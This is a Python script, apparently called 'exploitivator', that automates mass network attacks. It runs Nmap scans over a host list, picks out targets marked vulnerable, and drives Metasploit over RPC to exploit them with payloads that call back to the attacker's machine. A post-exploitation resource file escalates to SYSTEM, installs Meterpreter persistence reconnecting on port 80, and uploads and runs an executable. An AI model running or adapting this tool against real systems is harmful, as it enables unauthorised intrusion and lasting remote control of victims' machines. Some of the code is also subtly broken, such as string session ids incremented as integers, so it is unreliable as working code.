#!/usr/bin/env python

import os
import msfrpc
import optparse
import sys
import subprocess
import datetime
import time
import requests

import xml.etree.ElementTree as ET

from sys import argv
from collections import defaultdict



# Function to create the MSF .rc files
def builder(rhost, lhost, lport):
	post = open('/tmp/smbpost.rc', 'w')
	bat = open('/tmp/exploit_install.bat', 'w')

	postcomms = """getsystem
	run persistence -S -U -X -i 10 -p 80 -r """ + lhost + """
	cd c:\
	upload /tmp/exploit_patch.exe c:\
	upload /tmp/exploit_install.bat c:\
	execute -f exploit_install.bat
	"""

	batcomm = "exploit_patch.exe /quiet"
	post.write(postcomms)
	bat.write(batcomm)
	post.close()
	bat.close()
 

def initialise(username, msf_pass):

	# Declare global variables used here
	global msf_client
	global res
	global console_id
	global retval
	global outfile
	
	# Create a new instance of the Msfrpc client with the default options
	msf_client = msfrpc.Msfrpc({})

	# Login to the msf server using the password defined within msfconsole (msf> load msgrpc Pass=abc123)
	msf_client.login(user=username, password=msf_pass)

	res = msf_client.call('console.create')
	console_id = res['id']
	print "res: %s" %res
	#outfile.write("res: " + res)

	retval = msf_client.call('console.write', [console_id, "db_connect " + username + ":" + msf_pass + "@127.0.0.1/msf\n"])
	time.sleep(1)


# Sets up the chain of rc files for exploitation and post-exploitation
def exploit(rhost, lhost, lport, session, attack, payload, label):
	 
	# Exploit the host
	commands = """use """ + attack + """
	set PAYLOAD """ + payload + """
	set rhost """ + rhost + """
	set lhost """ + lhost + """
	set lport """ + lport + """
	set ExitOnSession false
	exploit -z
	"""
	print "[+] Exploiting " + label + " on: " + rhost
	msf_client.call('console.write', [console_id,commands])
	res = msf_client.call('console.read', [console_id])
	result = res['data'].split('n')
 
	# Run Post-exploit script
	runPost = """use post/multi/gather/run_console_rc_file
	set RESOURCE /tmp/smbpost.rc
	set SESSION """ + session + """
	exploit
	"""
	print "[+] Running post-exploit script on: " + rhost
	msf_client.call('console.write', [console_id,runPost])
	res = msf_client.call('console.read',[ console_id])
	# Setup Listener for presistent connection back over port 80
	time.sleep(10)
	#listen = """use exploit/multi/handler
	#set PAYLOAD windows/meterpreter/reverse_tcp
	#set lport 80
	#set lhost """ + lhost + """
	#exploit
	#"""

	#print "[+] Setting up listener on: "+lhost+":80"
	#client.call('console.write',[console_id,listen])
	#lres = client.call('console.read',[console_id])
	#print lres
 

def parse_nmap_xml(xmlfile):

	# Config file has the parameter in form: "-oG filename.gnmap", so it will need to be split on the space
	details = xmlfile.split(" ")
	filename = details[1]

	# Create element tree object from results file
	tree = ET.parse(filename)

	# Get XML root element
	root = tree.getroot()

	# Create empty list for scan results
	#items = []

	# Get all results
	for item in root.iter('host'):
 
		# Create empty scan result dictionary
		results = {}

		# Iterate through the child elements of each item
		for child in item:
			target = ""
			state = ""

			# Get address of target
			if child.tag == 'address' and child.attrib['addrtype'] == 'ipv4':
				#results['target'] = child.attrib['addr']
				target = child.attrib['addr']

			# Check for vulnerable host
			elif child.tag == 'hostscript':
				for subitem in child.iter('elem'):
					#print subitem.attrib
					if 'key' in subitem.attrib:
						if subitem.attrib['key'] == 'state':
							#results['state'] = subitem.text
 							state = subitem.text

			# Append item to dictionary
			if target.strip() != "":
				results.update({target: state})

		# Append scan dictionary items to results list
		#items.append(results)
     
	# Return results as dictionary
	#return items
	return results


def parse_gnmap(nmapfile, grep_ex):

	# Config file has the parameter in form: "-oG filename.gnmap", so it will need to be split on the space
	details = nmapfile.split(" ")
	filename = details[1]

	# Create empty list for scan results
	items = []
 
	# Read from results file, find vulnerable hosts and write to temp holding file
	cmd_line = 'cat ' + filename + ' | ' + grep_ex + ' | cut -d" " -f2 > temp.txt'
	os.system(cmd_line)

	# Get all results from temp file
	with open('temp.txt') as infile:
		vuln_hosts = infile.readlines()
	infile.close()
	
	# Iterate through the list of vulnerable hosts and add them to the dictionary
	for host in vuln_hosts:
 
		# Create empty scan result dictionary
		results = {}

		# Get address of vulnerable target and add to dictionary with a 'vulnerable' marker
		results['target'] = host
		results['state'] = 'vulnerable'
 
		# Append scan dictionary items to results list
		items.append(results)
	# Tidy up
	os.system('rm temp.txt')

	# Return results as dictionary
	return items


def main():

	# Set a default value for the MSF creds and start session (this session id will be incremented for each exploit)
	session = '1'
	username = "msf"
	msf_pass = "abc123"
	lport = 4444
	sleep_time = 120
	wait_for_key = False


	# Get command line arguments
	parser = optparse.OptionParser(sys.argv[0] + '-l lhost -p lport -f host_file -s session -u username -m msf_pass -t Sleep_time')

	parser.add_option('-l', dest='lhost', type='string', help = 'Specify the IP address of the attacking machine')
	parser.add_option('-p', dest='lport', type='string', help ='Specify a port to listen on')
	parser.add_option('-f', dest='host_file', type='string', help= 'Specify a file listing the remote hosts')
	parser.add_option('-s', dest='session', type='string', help ='Specify a starting session ID')
	parser.add_option('-u', dest='username', type='string', help = 'Specify a username for the MSF instance')
	parser.add_option('-m', dest='msf_pass', type='string', help ='Specify a username for the MSF instance')
	
	(options, args) = parser.parse_args()

	# Set the specified optional values
	if options.username != None:
		username = options.username
	if options.msf_pass != None:
		msf_pass = options.msf_pass
	if options.session != None:
		session = options.session
	if options.lport != None:
		lport = options.lport
 
	# Set the non-optional values
	host_file = options.host_file
	lhost = options.lhost

	# Check that values were provided
	if (host_file == None or lhost == None):
		print "Usage: exploitivator.py -l <local_host_ip> -f <target_list_file> [-p local_port -s <initial_session_id> -u <username> -m <password>]"
		sys.exit(0)


	# Get input data from files
	scan_file = "exploitivator_scan.cfg"
	config_file = "exploitivator.cfg"


	# Initialise scanner
	initialise(username, msf_pass)


	# Create an output log file
	outfile = open("exploitivator_output.txt", "w") 
	 
	outfile.write("MSF Attack Logs\n") 
	outfile.write("===============\n") 
	outfile.write("\n")

	# Iterate through scan paths in file and run each one


	# Get list of required Metasploit scans
	with open(scan_file) as infile:
		scans = infile.readlines()
	infile.close()

	# Remove whitespace
	scans = [scan_name.strip() for scan_name in scans] 
	if len(scans) < 1:
		print "[!] Empty scan config file."
		sys.exit(1)

	# Build list of exploits to scan for and to attempt from config files
	print "[*] Getting exploit requirements from file: " + scan_file
	with open(scan_file) as infile:
		sploits = infile.readlines()
	infile.close()
	
	# This dictionary will hold details for each scan and use the label from the first entry at the start of the line to identify them
	#scan_settings = defaultdict(list)
	scan_settings = {}
	
	for scan in scans:
		print scan
		items = scan.split("##")
		if len(items) < 3:
			print "[!] Bad scan config file entry!"
			sys.exit(2)
			
		# Create new dictionary entry from the config file
		#scan_settings[items[0]].append(items[1:])
		scan_settings.update({items[0]: items[1:]})


	# Pass list of hosts and attacks to Nmap
	print "[*] Beginning Nmap scans..."
	for details in scan_settings.itervalues():
		script_detail = details[0]
		print "Script detail:	" + script_detail
		#script_outfile = "./" + attack[2]
		script_outfile = details[1]
		print "Script outfile:	" + script_outfile
		# Construct the scan from config file details and run with '&' at the end, so we don't have to wait for it to finish
		cmd_line = "nmap " + script_detail + " " + script_outfile + " -iL " + host_file + " &"
		print "Executing:	" + cmd_line
		os.system(cmd_line)
	
	
	# Pause and wait for scans to finish
	# The exploits to be attempted will be read from config files so that will build in some additional time to allow scans to finish
	print "[*] All Nmap scans have been started..."
	if wait_for_key:
		raw_input("[*] Once Nmap scans have completed, press 'Enter' to continue...")
	else:
		print "[*] Pausing before exploitation attempts to allow scans to complete..."
		time.sleep(sleep_time)
	
	# Get Exploit details from config files
	with open(config_file) as infile:
		sploits = infile.readlines()
	infile.close()

	# This dictionary will hold details for each exploit and use the label from the first entry at the start of the line to identify them
	# Each scan label should map onto an exploit label
	sploit_settings = {}

	for sploit in sploits:
		items = sploit.split("##")
		if len(items) < 3:
			print "[!] Bad config file entry: " + sploit
			sys.exit(2)
			
		# Create new dictionary entry from the config file
		#sploit_settings[items[0]].append(items)
		sploit_settings.update({items[0]: items[1:]})
	
	# Pause for two minutes to allow scans to complete
	#time.sleep(120)
	print "[*] Beginning exploitation attempts..."
	
	# Read Nmap results and exploit any positive targets identified
	for attack in scan_settings:
		print "[*] Checking targets for " + attack +"\n"
		outfile.write("=========================================================\n")
		outfile.write("Vulnerability:" + attack +"\n")
		outfile.write("---------------------------------------------------------\n")

		# Get vulnerable targets
		script_outfile = scan_settings[attack][1]		
		
		if script_outfile[-4:] == ".xml":
			# Find any vulnerable targets
			target_map = parse_nmap_xml(script_outfile)
			
			# Create target list and write to logs
			for target_host in target_map:
				if (target_map[target_host].lower() == 'vulnerable' or target_map[target_host].lower() == 'likely vulnerable'):
					print "[*] Attempting to exploit: " + target_host
					outfile.write("Target: " + target_host)
					outfile.write("Session: " + session)

					# Map vulnerable target onto exploit details for the scan and exploit
					if sploit_settings[attack] == None:
						print "[*] No attack settings for: " + attack
						outfile.write("No attack setting for: " + attack)
					else:
						exploit(target_host, lhost, lport, session, sploit_settings[attack][1], sploit_settings[attack][2], attack)

					# Modify port and session to prevent conflicts for next exploit
					lport += 1
					session += 1
			
		elif script_outfile[-4:] == ".gnmap":
			# Find any vulnerable targets
			target_map = parse_gnmap(script_outfile, scan_settings[attack][3])

			# Create target list and write to logs
			for target_host in target_map:
				print "[*] Attempting to exploit: " + target_host
				outfile.write("Target:" + target_host)
				outfile.write("Session: " + session)

				# Map vulnerable target onto exploit details for the scan and exploit
				if sploit_settings[attack] == None:
					print "[*] No attack setting for: " + attack
					outfile.write("No attack setting for: " + attack)
				else:
					exploit(target_host, lhost, lport, session, sploit_settings[attack][1], sploit_settings[attack][2], attack)

				# Modify port and session to prevent conflicts for next exploit
				lport += 1
				session += 1
		
			# Iterate through list of vulnerable targets and exploit 
			#builder(rhost, lhost, lport)
			#exploit(rhost, lhost, lport, session)

	print "[*] Finished!"

	# Close the output file
	outfile.close()

if __name__ == "__main__":
	main()
